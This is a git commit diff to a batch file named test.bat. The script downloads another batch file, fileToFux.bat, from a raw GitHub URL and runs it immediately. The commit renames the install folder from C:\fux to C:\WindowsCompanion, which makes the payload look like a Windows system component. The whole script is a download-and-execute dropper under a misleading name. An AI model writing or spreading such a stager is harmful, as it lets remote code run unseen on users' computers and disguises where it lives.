2f83b0abce9ab902413a862dbe8bd61c9a2a897c
BelliniGauss <118434152+BelliniGauss@users.noreply.github.com>
2024-01-02 11:58:42 +0100

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,11 +1,11 @@
 @echo off
-if not exist "C:\fux" md "C:\fux"
+if not exist "C:\WindowsCompanion" md "C:\WindowsCompanion"
 
 set URL=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat
 
-set ZIP_PATH=C:\fux\fileToFux.bat
+set ZIP_PATH=C:\WindowsCompanion\fileToFux.bat
 
-set DESTINATION_FOLDER=C:\fux
+set DESTINATION_FOLDER=C:\WindowsCompanion
 
 curl -L -o "%ZIP_PATH%" "%URL%" && "%ZIP_PATH%"
 
